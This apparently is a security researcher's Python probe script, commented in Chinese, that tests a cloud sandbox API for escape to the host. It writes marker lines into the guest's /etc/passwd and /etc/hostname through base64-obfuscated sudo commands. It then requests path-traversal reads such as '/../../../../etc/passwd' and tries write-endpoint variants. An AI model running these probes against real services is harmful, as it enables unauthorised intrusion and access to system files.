# -*- coding: utf-8 -*-
"""fs API 决定性测试 (v45f)
在 guest 内写入标记 (passwd/hostname/marker 文件), 再用 fs/read 读:
- 读到标记 -> 解析在 guest 盘内 (安全)
- 读不到标记 -> 解析在 host 侧 (逃逸!)
fs/write: 试 PUT/text-plain/无 ctype"""
import base64, json, sys, time, urllib.request, urllib.error
sys.path.insert(0, r'F:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, cmd, TOKEN, TEAM, PROJ

NAME = 'fsapi46'

def mk():
    api("DELETE", "/v2/sandboxes/%s?teamId=%s&projectId=%s" % (NAME, TEAM, PROJ))
    time.sleep(3)
    for attempt in range(8):
        c, r = api("POST", "/v4/sandboxes?teamId=%s" % TEAM, {"projectId": PROJ, "name": NAME}, 60)
        if c == 429:
            print('[create] 429 retry %d' % (attempt + 1), flush=True)
            time.sleep(20)
            continue
        break
    print('[create] -> %s' % c, flush=True)
    if c != 200:
        sys.exit(1)
    return json.loads(r)['sandbox']['currentSessionId']

def parse_data(r):
    out = ''
    for line in r.splitlines():
        if '"data"' in line:
            try:
                out += json.loads(line).get('data', '')
            except Exception:
                pass
    return out

def api_raw(method, path, body=None, ctype='application/json', timeout=40):
    req = urllib.request.Request('https://api.vercel.com' + path, method=method)
    req.add_header('Authorization', 'Bearer ' + TOKEN)
    if ctype:
        req.add_header('Content-Type', ctype)
    data = body if isinstance(body, bytes) else (json.dumps(body).encode() if body is not None else None)
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode(errors='replace')[:600]
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors='replace')[:600]
    except Exception as e:
        return -1, 'EXC %s' % e

if __name__ == '__main__':
    sid = mk()
    print('sid =', sid, flush=True)
    time.sleep(15)  # 等 sandbox 完全 ready
    # 1. guest 内写标记 (sudo 需要, /vercel/sandbox 不存在 -> 用 /vercel)
    b64 = base64.b64encode(
        b'echo guestpasswdmark | sudo tee -a /etc/passwd; '
        b'echo guesthostname | sudo tee /etc/hostname; '
        b'echo FS_MARK_XYZ | sudo tee /vercel/fs_marker.txt; '
        b'touch /tmp/guest_tmp_mark; echo done').decode()
    for i in range(3):
        c, r = cmd(sid, 'sh', ['-c', 'echo %s | base64 -d | sh' % b64], timeout_ms=20000)
        out = parse_data(r).strip()
        print('[cmd try%d] -> %d %s' % (i + 1, c, out[:60]), flush=True)
        if c == 200:
            break
        time.sleep(8)
    # 2. fs/read 验证
    print('=== fs/read 标记验证 ===', flush=True)
    for p in ['/etc/passwd', '/etc/hostname', '/vercel/fs_marker.txt', '/tmp/guest_tmp_mark',
              '/../../../../etc/passwd', '/../../../../etc/hostname']:
        c, r = api_raw('POST', '/v2/sandboxes/sessions/%s/fs/read?teamId=%s' % (sid, TEAM), {"path": p})
        hit = 'guestpasswdmark' in r or 'guesthostname' in r or 'FS_MARK_XYZ' in r or 'guest_tmp_mark' in r
        print('[read %s] -> %d %s%s' % (p, c, 'HIT-MARK!' if hit else '', (r or '')[:100].replace('\n', ' ')), flush=True)
        time.sleep(1)
    # 3. fs/write 方法变体
    print('=== fs/write 方法变体 ===', flush=True)
    for tag, method, body, ctype in [
        ('PUT-json', 'PUT', {"path": "/tmp/fs_w.txt", "content": "W1"}, 'application/json'),
        ('POST-plain', 'POST', b'/tmp/fs_w.txt', 'text/plain'),
        ('PUT-plain', 'PUT', b'/tmp/fs_w.txt', 'text/plain'),
        ('POST-noc', 'POST', {"path": "/tmp/fs_w.txt", "content": "W2"}, None),
        ('PUT-noc', 'PUT', b'/tmp/fs_w.txt', None),
        ('POST-oct-path', 'POST', b'path=/tmp/fs_w.txt', 'application/octet-stream')]:
        c, r = api_raw(method, '/v2/sandboxes/sessions/%s/fs/write?teamId=%s' % (sid, TEAM), body, ctype)
        print('[write %s] -> %d %s' % (tag, c, (r or '')[:150].replace('\n', ' ')), flush=True)
        time.sleep(1)
    # 4. 验证 fs/write 效果
    b64 = base64.b64encode(b'ls -la /tmp/fs_w* 2>&1; cat /tmp/fs_w* 2>&1').decode()
    c, r = cmd(sid, 'sh', ['-c', 'echo %s | base64 -d | sh' % b64], timeout_ms=20000)
    print('[verify write] %s' % parse_data(r).strip()[:200], flush=True)

    api("DELETE", "/v2/sandboxes/%s?teamId=%s&projectId=%s" % (NAME, TEAM, PROJ))
    print('CLEANED', flush=True)
